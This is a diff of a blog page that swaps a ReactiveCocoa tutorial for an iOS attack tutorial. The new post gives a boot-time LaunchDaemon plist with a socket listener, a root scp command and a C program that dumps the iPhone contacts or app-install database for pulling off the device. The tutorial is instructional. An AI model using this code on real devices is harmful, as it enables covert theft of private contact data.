@@ -73,7 +73,7 @@
 
 
 
-  <meta name="keywords" content="iOS,RAC," />
+  <meta name="keywords" content="iOS,攻防," />
 
 
 
@@ -86,18 +86,21 @@
 
 
 
-<meta name="description" content="君不见黄河之水天上来，奔流到海不复回。君不见高堂明镜悲白发，朝如青丝暮成雪。人生得意须尽欢，莫使金樽空对月。天生我材必有用，千金散尽还复来。烹羊宰牛且为乐，会须一饮三百杯。岑夫子，丹丘生，将进酒，杯莫停。与君歌一曲，请君为我侧耳听。钟鼓馔玉不足贵，但愿长醉不复醒。古来圣贤皆寂寞，惟有饮者留其名。陈王昔时宴平乐，斗酒十千恣欢谑。主人何为言少钱，径须沽取对君酌。五花马，千金裘，呼儿将出换美酒，与尔">
-<meta name="keywords" content="iOS,RAC">
+<meta name="description" content="咱们应当在一起，否则就太伤天害理啦。 ——王小波《爱你就像爱生命》  简介 通过在iPhone上开启一个开机自启进程，读取用户手机通讯录数据库或者用户应用安装列表，写到标准输出。 开启一个Socket通信端口。 通过使用NetCat将iPhone手机的指定ip端口数据以文件格式传输到Mac桌面上。  了解一下OS X的启动原理 Mac下的启动服务主要有三个地方可配置：  系统偏好设置-&amp;gt;">
+<meta name="keywords" content="iOS,攻防">
 <meta property="og:type" content="article">
-<meta property="og:title" content="iOS开发ReactiveCocoa（一）：介绍">
-<meta property="og:url" content="https://sevencho.github.io/archives/48d913e0.html">
+<meta property="og:title" content="iOS攻防（二）：窃取用户的通讯录信息 &amp; 偷窥用户安装应用列表 &amp; Netcat使用">
+<meta property="og:url" content="https://sevencho.github.io/archives/bf5c1be0.html">
 <meta property="og:site_name" content="曹雪松de博客|CoderBoy&#39;s Blog">
-<meta property="og:description" content="君不见黄河之水天上来，奔流到海不复回。君不见高堂明镜悲白发，朝如青丝暮成雪。人生得意须尽欢，莫使金樽空对月。天生我材必有用，千金散尽还复来。烹羊宰牛且为乐，会须一饮三百杯。岑夫子，丹丘生，将进酒，杯莫停。与君歌一曲，请君为我侧耳听。钟鼓馔玉不足贵，但愿长醉不复醒。古来圣贤皆寂寞，惟有饮者留其名。陈王昔时宴平乐，斗酒十千恣欢谑。主人何为言少钱，径须沽取对君酌。五花马，千金裘，呼儿将出换美酒，与尔">
+<meta property="og:description" content="咱们应当在一起，否则就太伤天害理啦。 ——王小波《爱你就像爱生命》  简介 通过在iPhone上开启一个开机自启进程，读取用户手机通讯录数据库或者用户应用安装列表，写到标准输出。 开启一个Socket通信端口。 通过使用NetCat将iPhone手机的指定ip端口数据以文件格式传输到Mac桌面上。  了解一下OS X的启动原理 Mac下的启动服务主要有三个地方可配置：  系统偏好设置-&amp;gt;">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-07-05T01:24:45.410Z">
+<meta property="og:image" content="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84iTunesstore%E4%BF%A1%E6%81%AF-01.png">
+<meta property="og:image" content="https://sevencho.github.io/uploads/assets/hack_appList_result_failed.png">
+<meta property="og:updated_time" content="2018-07-06T02:16:40.148Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="iOS开发ReactiveCocoa（一）：介绍">
-<meta name="twitter:description" content="君不见黄河之水天上来，奔流到海不复回。君不见高堂明镜悲白发，朝如青丝暮成雪。人生得意须尽欢，莫使金樽空对月。天生我材必有用，千金散尽还复来。烹羊宰牛且为乐，会须一饮三百杯。岑夫子，丹丘生，将进酒，杯莫停。与君歌一曲，请君为我侧耳听。钟鼓馔玉不足贵，但愿长醉不复醒。古来圣贤皆寂寞，惟有饮者留其名。陈王昔时宴平乐，斗酒十千恣欢谑。主人何为言少钱，径须沽取对君酌。五花马，千金裘，呼儿将出换美酒，与尔">
+<meta name="twitter:title" content="iOS攻防（二）：窃取用户的通讯录信息 &amp; 偷窥用户安装应用列表 &amp; Netcat使用">
+<meta name="twitter:description" content="咱们应当在一起，否则就太伤天害理啦。 ——王小波《爱你就像爱生命》  简介 通过在iPhone上开启一个开机自启进程，读取用户手机通讯录数据库或者用户应用安装列表，写到标准输出。 开启一个Socket通信端口。 通过使用NetCat将iPhone手机的指定ip端口数据以文件格式传输到Mac桌面上。  了解一下OS X的启动原理 Mac下的启动服务主要有三个地方可配置：  系统偏好设置-&amp;gt;">
+<meta name="twitter:image" content="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84iTunesstore%E4%BF%A1%E6%81%AF-01.png">
 
 
 
@@ -127,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="https://sevencho.github.io/archives/48d913e0.html"/>
+  <link rel="canonical" href="https://sevencho.github.io/archives/bf5c1be0.html"/>
 
 
 
 
 
-  <title>iOS开发ReactiveCocoa（一）：介绍 | 曹雪松de博客|CoderBoy's Blog</title>
+  <title>iOS攻防（二）：窃取用户的通讯录信息 & 偷窥用户安装应用列表 & Netcat使用 | 曹雪松de博客|CoderBoy's Blog</title>
   
 
 
@@ -314,7 +317,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://sevencho.github.io/archives/48d913e0.html">
+    <link itemprop="mainEntityOfPage" href="https://sevencho.github.io/archives/bf5c1be0.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="曹雪松">
@@ -331,7 +334,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">iOS开发ReactiveCocoa（一）：介绍</h1>
+          <h1 class="post-title" itemprop="name headline">iOS攻防（二）：窃取用户的通讯录信息 & 偷窥用户安装应用列表 & Netcat使用</h1>
         
 
         <div class="post-meta">
@@ -343,8 +346,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-01-25T20:27:45+08:00">
-                2016-01-25
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-05T18:27:45+08:00">
+                2018-07-05
               </time>
             
 
@@ -377,8 +380,8 @@
                 
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/iOS/ReactiveCocoa/" itemprop="url" rel="index">
-                    <span itemprop="name">ReactiveCocoa</span>
+                  <a href="/categories/iOS/攻防/" itemprop="url" rel="index">
+                    <span itemprop="name">攻防</span>
                   </a>
                 </span>
 
@@ -408,7 +411,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  2,796
+                  1,540
                 </span>
               
 
@@ -424,7 +427,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  11
+                  7
                 </span>
               
             </div>
@@ -447,184 +450,215 @@
       
         <hr>
 <blockquote>
-<p>君不见黄河之水天上来，奔流到海不复回。<br>君不见高堂明镜悲白发，朝如青丝暮成雪。<br>人生得意须尽欢，莫使金樽空对月。<br>天生我材必有用，千金散尽还复来。<br>烹羊宰牛且为乐，会须一饮三百杯。<br>岑夫子，丹丘生，将进酒，杯莫停。<br>与君歌一曲，请君为我侧耳听。<br>钟鼓馔玉不足贵，但愿长醉不复醒。<br>古来圣贤皆寂寞，惟有饮者留其名。<br>陈王昔时宴平乐，斗酒十千恣欢谑。<br>主人何为言少钱，径须沽取对君酌。<br>五花马，千金裘，<br>呼儿将出换美酒，与尔同销万古愁。</p>
-<p>——李白《将进酒·君不见黄河之水天上来》</p>
+<p>咱们应当在一起，否则就太伤天害理啦。</p>
+<p>——王小波《爱你就像爱生命》</p>
 </blockquote>
-<h2 id="ReactiveCocoa"><a href="#ReactiveCocoa" class="headerlink" title="ReactiveCocoa"></a>ReactiveCocoa</h2><ul>
-<li>是函数响应编程(Functional Reactive Programming, FRP)框架</li>
-<li>实际的开发中是和MVVM结合进行开发、互相弥补</li>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
+<li>通过在iPhone上开启一个开机自启进程，读取用户手机通讯录数据库或者用户应用安装列表，写到标准输出。</li>
+<li>开启一个Socket通信端口。</li>
+<li>通过使用<code>NetCat</code>将iPhone手机的指定ip端口数据以文件格式传输到Mac桌面上。</li>
 </ul>
-<h3 id="Github上整合的比较全面的（MVVM、RAC）学习资料"><a href="#Github上整合的比较全面的（MVVM、RAC）学习资料" class="headerlink" title="Github上整合的比较全面的（MVVM、RAC）学习资料"></a>Github上整合的比较全面的（MVVM、RAC）学习资料</h3><ul>
-<li><a href="https://github.com/ReactiveCocoaChina/ReactiveCocoaChineseResources" target="_blank" rel="noopener">Github 上面比较全的资料</a></li>
-</ul>
-<h3 id="美团的几篇资料-（开发中可能遇到的坑）"><a href="#美团的几篇资料-（开发中可能遇到的坑）" class="headerlink" title="美团的几篇资料 （开发中可能遇到的坑）"></a>美团的几篇资料 （开发中可能遇到的坑）</h3><ul>
-<li><a href="http://tech.meituan.com/talk-about-reactivecocoas-cold-signal-and-hot-signal-part-1.html" target="_blank" rel="noopener">细说ReactiveCocoa的冷信号与热信号1</a></li>
-<li><a href="http://tech.meituan.com/talk-about-reactivecocoas-cold-signal-and-hot-signal-part-2.html" target="_blank" rel="noopener">细说ReactiveCocoa的冷信号与热信号2</a></li>
-<li><a href="http://tech.meituan.com/talk-about-reactivecocoas-cold-signal-and-hot-signal-part-3.html" target="_blank" rel="noopener">细说ReactiveCocoa的冷信号与热信号3</a></li>
-<li><a href="http://tech.meituan.com/RACSignalSubscription.html" target="_blank" rel="noopener">RACSignal的Subscription深入分析</a></li>
-</ul>
-<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ul>
-<li>RAC只处理对象, 而不处理像BOOL这样的原始值. 不过, RAC通常会帮我们自动做这些转换.</li>
-<li><p>使用Cocoapods导入ReactiveCocoa 报错 ld: library not found for -lPods</p>
+<h2 id="了解一下OS-X的启动原理"><a href="#了解一下OS-X的启动原理" class="headerlink" title="了解一下OS X的启动原理"></a>了解一下OS X的启动原理</h2><ul>
+<li><p>Mac下的启动服务主要有三个地方可配置：</p>
 <ul>
-<li>解决方法 : Target’s General settings and go to Linked Frameworks and Libraries and just delete -libPods.a from the list.</li>
+<li>系统偏好设置-&gt;帐户-&gt;登陆项</li>
+<li><code>/System/Library/StartupItems</code> 和 <code>/Library/StartupItems/</code></li>
+<li><code>launchd</code> 系统初始化进程配置。<ul>
+<li>launchd是Mac OS下，用于初始化系统环境的关键进程。类似Linux下的init, rc。</li>
 </ul>
 </li>
-<li><p>信号的释放</p>
+</ul>
+</li>
+<li><p>启动过程</p>
 <ul>
-<li>ReactiveCocoa维护了一个全局的信号集合。</li>
-<li>如果信号有一个或多个订阅者，它就是可用的。如果所有订阅者都被移除了，信号就被释放了。</li>
+<li>mac固件激活，初始化硬件，加载BootX引导器。</li>
+<li>BootX加载内核与内核扩展(kext)。</li>
+<li>内核启动launchd进程。</li>
+<li>launchd根据<ul>
+<li><code>/System/Library/LaunchAgents</code></li>
+<li><code>/System/Library/LaunchDaemons</code></li>
+<li><code>/Library/LaunchDaemons</code></li>
+<li><code>Library/LaunchAgents</code></li>
+<li><code>~/Library/LaunchAgents</code>里的plist配置，启动服务守护进程。</li>
 </ul>
 </li>
-<li><p>信号的取消订阅</p>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>LaunchDaemons（后台驻留程序启动）是用户未登陆前就启动的服务(守护进程)<br>LaunchAgents（启动代理）是用户登陆后启动的服务(守护进程)</p>
+</blockquote>
 <ul>
-<li>在一个completed事件或error事件后，一个订阅者会自动将自己移除。</li>
-<li>手动移除可能通过RACDisposable来完成。RACSignal的所有订阅方法都返回一个RACDisposable实例，我们可以调用它的dispose方法来手动移除订阅者。</li>
-</ul>
-</li>
-<li>如果我们创建了一个信号，但不去订阅它，则信号永远不会执行，包括任何如doNext:这样的附加操作。</li>
-<li>Signal events是线性的，不会出现并发的情况，除非显式地指定Scheduler。所以subscribeNext:error:completed:里的block不需要锁定或者synchronized等操作，其他的events会依次排队，直到block处理完成。</li>
-<li>生成Signal时，最好指定Name, -setNameWithFormat: 方便调试</li>
-<li>Side Effect （副作用）<ul>
-<li>Hot signals without side effects 最好使用property，如“textChanged”，不太理解什么情况用到这个，权当做一个静态的属性来看就行。</li>
-<li>Cold signals without side effects 使用名词类型的方法名，如“-currentText”，“currentModels”，同时表明了返回值是什么（这个尤其得注意，RACSignal的next值是id类型，所以全得是靠约定才知道具体返回类型）</li>
-<li>Signals with side effects 这种就是像login一样有副作用的了，推荐使用动词类型的方法名，用对动词基本就能知道是不是有副作用了，比如“-loginSignal”和“-saveToFile”大概就知道前面一个很可能有副作用，后面一个多存几次文件应该没副作用</li>
+<li>理解几个基础概念：<code>/System/Library</code>和<code>/Library</code>和<code>~/Library</code>目录的区别？<ul>
+<li><code>/System/Library</code>目录是存放Apple自己开发的软件。</li>
+<li><code>/Library</code>目录是系统管理员存放的第三方软件。</li>
+<li><code>~/Library/</code>是用户自己存放的第三方软件。</li>
 </ul>
 </li>
 </ul>
-<h3 id="RAC-VS-原生"><a href="#RAC-VS-原生" class="headerlink" title="RAC VS 原生"></a>RAC VS 原生</h3><ul>
-<li><code>rac_signalForSelector</code>：用于替代代理</li>
-<li><code>rac_valuesAndChangesForKeyPath</code>：用于监听某个对象的属性改变</li>
-<li><code>rac_signalForControlEvents</code>：用于监听某个事件。</li>
-<li><code>rac_addObserverForName</code>:用于监听某个通知</li>
-<li><code>rac_textSignal</code>:只要文本框发出改变就会发出这个信号</li>
-<li>处理当界面有多次请求时，需要都获取到数据时，才能展示界面<ul>
-<li><code>rac_liftSelector:withSignalsFromArray:Signals</code>:当传入的Signals(信号数组)，每一个signal都至少sendNext过一次，就会去触发第一个selector参数的方法</li>
-<li>使用注意：几个信号，参数一的方法就几个参数，每个参数对应信号发出的数据</li>
+<h3 id="几个目录下plist文件格式及每个字段的含义："><a href="#几个目录下plist文件格式及每个字段的含义：" class="headerlink" title="几个目录下plist文件格式及每个字段的含义："></a>几个目录下plist文件格式及每个字段的含义：</h3><ul>
+<li>因为iOS和Macd都是基于Unix，所以启动过程基本是类似的。</li>
 </ul>
+<table>
+<thead>
+<tr>
+<th><center>Key</center></th>
+<th><span class="Apple-tab-span" style="white-space:pre"></span><center>Description</center></th>
+<th><center>Required</center></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Label</td>
+<td>The name of the job</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>ProgramArguments</td>
+<td>Strings to pass to the program when it is executed</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>UserName</td>
+<td>The job will be run as the given user, who may not necessarily be the one who submitted it to launchd.</td>
+<td>no</td>
+</tr>
+<tr>
+<td>inetdCompatibility</td>
+<td>Indicates that the daemon expects to be run as if it were launched by inetd</td>
+<td>no</td>
+</tr>
+<tr>
+<td>Program</td>
+<td>The path to your executable. This key can save the ProgramArguments key for flags and arguments.</td>
+<td>no</td>
+</tr>
+<tr>
+<td>onDemand</td>
+<td>A boolean flag that defines if a job runs continuously or not</td>
+<td>no</td>
+</tr>
+<tr>
+<td>RootDirectory</td>
+<td>The job will be?chrooted?into another directory</td>
+<td>no</td>
+</tr>
+<tr>
+<td>ServiceIPC</td>
+<td>Whether the daemon can speak IPC to launchd</td>
+<td>no</td>
+</tr>
+<tr>
+<td>WatchPaths</td>
+<td>Allows launchd to start a job based on modifications at a file-system path</td>
+<td>no</td>
+</tr>
+<tr>
+<td>QueueDirectories</td>
+<td>Similar to WatchPath, a queue will only watch an empty directory for new files</td>
+<td>no</td>
+</tr>
+<tr>
+<td>StartInterval</td>
+<td>Used to schedule a job that runs on a repeating schedule. Specified as the number of seconds to wait between runs.</td>
+<td>no</td>
+</tr>
+<tr>
+<td>StartCalendarInterval</td>
+<td>Job scheduling. The syntax is similar to cron.</td>
+<td>no</td>
+</tr>
+<tr>
+<td>HardResourceLimits</td>
+<td>Controls restriction of the resources consumed by any job</td>
+<td>no</td>
+</tr>
+<tr>
+<td>LowPriorityIO</td>
+<td>Tells the kernel that this task is of a low priority when doing file system I/O</td>
+<td>no</td>
+</tr>
+<tr>
+<td>Sockets</td>
+<td>An array can be used to specify what socket the daemon will listen on for launch on demand</td>
+<td>no</td>
+</tr>
+</tbody>
+</table>
+<h2 id="配置一个Hack通讯录进程的plist文件"><a href="#配置一个Hack通讯录进程的plist文件" class="headerlink" title="配置一个Hack通讯录进程的plist文件"></a>配置一个Hack通讯录进程的plist文件</h2><ul>
+<li>我们需要通过一个plist文件在系统加载时候启动一个进程。</li>
+<li><p>如：一个名为<code>hack</code>的进程，该进程加载的可执行文件<code>hack</code>的路径是<code>/usr/bin/hack</code>。</p>
+</li>
+<li><p>配置的plist如下：</p>
 </li>
 </ul>
-<h3 id="RAC提供的宏"><a href="#RAC提供的宏" class="headerlink" title="RAC提供的宏"></a>RAC提供的宏</h3><ul>
-<li><p><code>RAC()</code>    </p>
+<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84iTunesstore%E4%BF%A1%E6%81%AF-01.png" alt="hack_plist"></p>
 <ul>
-<li>你提供想要与即将到来的值绑定的对象和参数, 在其内部它所做的是创建一个订阅者并更新其属性的值</li>
-<li><p>这个宏是最常用的，RAC()总是出现在等号左边，等号右边是一个RACSignal，表示的意义是将一个对象的一个属性和一个signal绑定，signal每产生一个value（id类型），都会自动执行：[TARGET setValue:value ?: NIL_VALUE forKeyPath:KEYPATH];</p>
-<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RACSignal *usernameIsValidSignal = RACObserve(<span class="keyword">self</span>.viewModel, isUsernameValid);</span><br><span class="line">RAC(<span class="keyword">self</span>.goButton, enabled) = usernameIsValidSignal; </span><br><span class="line">RAC(<span class="keyword">self</span>.goButton, alpha) = [usernameIsValidSignal map:^<span class="keyword">id</span>(<span class="built_in">NSNumber</span> *usernameIsValid)&#123; </span><br><span class="line"><span class="keyword">return</span> usernameIsValid.boolValue ? @<span class="number">1.0</span> : @<span class="number">0.5</span>; </span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
-</li>
+<li>plist源码如下：<ul>
+<li><code>Program</code> ： 进程可执行文件加载路径</li>
+<li><code>StandardErrorPath</code> ：标准错误路径</li>
+<li><code>ProgramArguments</code> ： 用户登陆后启动的服务路径</li>
+<li><code>inetdCompatibility</code> ：是一个因特网超级服务器(即inetd守护进程）来简化守护进程的编写。</li>
+<li><code>SockServiceName</code> ： Socket通信端口名称</li>
 </ul>
 </li>
-<li><p><code>RACObserve()</code></p>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple Computer//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">   hack.plist</span><br><span class="line"></span><br><span class="line">   Created by 曹雪松 on 2018/7/5.</span><br><span class="line">   Copyright (c) 2018 曹雪松. All rights reserved.</span><br><span class="line">--&gt;</span><br><span class="line">&lt;plist version=&quot;1.0&quot;&gt;</span><br><span class="line">    &lt;dict&gt;</span><br><span class="line">        &lt;key&gt;Program&lt;/key&gt;</span><br><span class="line">        &lt;string&gt;/usr/bin/hack&lt;/string&gt;</span><br><span class="line">        &lt;key&gt;StandardErrorPath&lt;/key&gt;</span><br><span class="line">        &lt;string&gt;/dev/null&lt;/string&gt;</span><br><span class="line">        &lt;key&gt;SessionCreate&lt;/key&gt;</span><br><span class="line">        &lt;true/&gt;</span><br><span class="line">        &lt;key&gt;ProgramArguments&lt;/key&gt;</span><br><span class="line">        &lt;array&gt;</span><br><span class="line">            &lt;string&gt;/usr/bin/hack&lt;/string&gt;</span><br><span class="line">        &lt;/array&gt;</span><br><span class="line">        &lt;key&gt;inetdCompatibility&lt;/key&gt;</span><br><span class="line">        &lt;dict&gt;</span><br><span class="line">            &lt;key&gt;Wait&lt;/key&gt;</span><br><span class="line">            &lt;false/&gt;</span><br><span class="line">        &lt;/dict&gt;</span><br><span class="line">        &lt;key&gt;Sockets&lt;/key&gt;</span><br><span class="line">        &lt;dict&gt;</span><br><span class="line">            &lt;key&gt;Listeners&lt;/key&gt;</span><br><span class="line">            &lt;dict&gt;</span><br><span class="line">                &lt;key&gt;SockServiceName&lt;/key&gt;</span><br><span class="line">                &lt;string&gt;55&lt;/string&gt;</span><br><span class="line">            &lt;/dict&gt;</span><br><span class="line">        &lt;/dict&gt;</span><br><span class="line">    &lt;/dict&gt;</span><br><span class="line">&lt;/plist&gt;</span><br></pre></td></tr></table></figure>
 <ul>
-<li><p>这个宏是RAC中对KVO中那些API的替代. 你只需要传入对象和你想观察的那个对象某属性的 keypath. 给出这些参数后, RACObserve会创建一个信号, 一旦它有了订阅者, 它就立刻发送那个属性的当前值, 并在发送那个属性在这之后的任何变化.</p>
-<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create and get a reference to the signal </span></span><br><span class="line">RACSignal *usernameValidSignal = RACObserve(<span class="keyword">self</span>.viewModel,  isUsernameValid);</span><br><span class="line"><span class="comment">// update the local property when this value changes</span></span><br><span class="line">[usernameValidSignal subscribeNext: ^(<span class="built_in">NSNumber</span> *isValidNumber) &#123;</span><br><span class="line"><span class="keyword">self</span>.usernameIsValid = isValidNumber. boolValue</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
-</li>
+<li>将plist文件传送到至iPhone/System/Library/LaunchDaemons/ 下</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp /Users/sevencho/Desktop/hack.plist root@192.168.1.60:/System/Library/LaunchDaemons/hack.plist</span><br></pre></td></tr></table></figure>
+<h2 id="读取通讯录-amp-用户安装App列表-的执行程序"><a href="#读取通讯录-amp-用户安装App列表-的执行程序" class="headerlink" title="读取通讯录 &amp; 用户安装App列表 的执行程序"></a>读取通讯录 &amp; 用户安装App列表 的执行程序</h2><ul>
+<li>我们只要能拿出AddressBook.sqlitedb/itunesstored2.sqlitedb就可以拿到用户的数据。<ul>
+<li>AddressBook的数据都在<code>/var/mobile/Library/AddressBook/AddressBook.sqlitedb</code>中，</li>
+<li>iTunes Store的数据都在<code>/var/mobile/Library/com.apple.itunesstored2.sqlitedb/itunesstored2.sqlitedb</code>中，</li>
 </ul>
 </li>
-<li><p>循环引用的宏 </p>
+<li>写一个函数用于读取用户通讯录数据库或者用户安装App列表。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  hack.c</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by 曹雪松 on 2018/7/5.</span></span><br><span class="line"><span class="comment">//  Copyright © 2018 曹雪松. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE <span class="meta-string">"/var/mobile/Library/AddressBook/AddressBook.sqlitedb"</span> <span class="comment">// 手机的通讯录数据库路径</span></span></span><br><span class="line"><span class="comment">// #define FILE "/var/mobile/Library/com.apple.itunesstored2.sqlitedb/itunesstored2.sqlitedb" // 用户安装app列表文件</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(FILE, O_RDONLY); <span class="comment">// 读数据库文件，返回文件句柄标识</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (( ret = read(fd, buf, <span class="keyword">sizeof</span>(buf))) &gt; <span class="number">0</span>)&#123; <span class="comment">// 将文件读进buff中</span></span><br><span class="line">        write( fileno(<span class="built_in">stdout</span>), buf, ret); <span class="comment">// 写到标准输出中</span></span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <ul>
-<li>@weakify(self); // 在外面声明</li>
-<li>@strongify(self); // 在引用的地方声明</li>
-<li>这两个宏一定成对出现，先weak再strong</li>
+<li>生成可执行文件<ul>
+<li>在<code>hack.c</code>所在目录执行，也可以直接指定文件路径</li>
 </ul>
 </li>
 </ul>
-<h3 id="常用知识点"><a href="#常用知识点" class="headerlink" title="常用知识点"></a>常用知识点</h3><ul>
-<li>map : <ul>
-<li>将一个值转化为另一个值输出</li>
-<li>将会创建一个和原来一模一样的信号，只不过新的信号传递的值变为了block（value），也就是说，如果block(value)是一个信号，那么就是信号的value仍然是信号。</li>
-</ul>
-</li>
-<li><code>flattenMap</code> : 解决Signal of Signals问题，flattenMap则会继续调用这个信号的value，作为新的信号的value。</li>
-<li><code>switchToLatest</code> : 用于signal of signals，获取signal of signals发出的最新信号,也就是可以直接拿到RACCommand中的信号</li>
-<li><code>filter</code> : 过滤一些条件，以确保符合条件的值才能被传递出去</li>
-<li><p><code>ignore</code> : 忽略给定的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xcrun -sdk iphoneos clang -arch armv7s -o hack hack.c</span><br></pre></td></tr></table></figure>
 <ul>
-<li><p>注意，这里忽略的既可以是地址相同的对象，也可以是- isEqual:结果相同的值，也就是说自己写的Model对象可以通过重写- isEqual:方法来使- ignore:生效。常用的值的判断没有问题，如下:</p>
-<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[[<span class="keyword">self</span>.inputTextField.rac_textSignal ignore:<span class="string">@"seven"</span>] subscribeNext:^(<span class="built_in">NSString</span> *value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">NSLog</span>(<span class="string">@"`seven` could never appear : %@"</span>, value);</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
-</li>
+<li>可执行文件签名，并传输至iPhone手机<code>/usr/bin</code>目录</li>
 </ul>
-</li>
-<li><p><code>distinctUntilChanged</code> : 它将这一次的值与上一次做比较，当相同时（也包括- isEqual:）被忽略掉。</p>
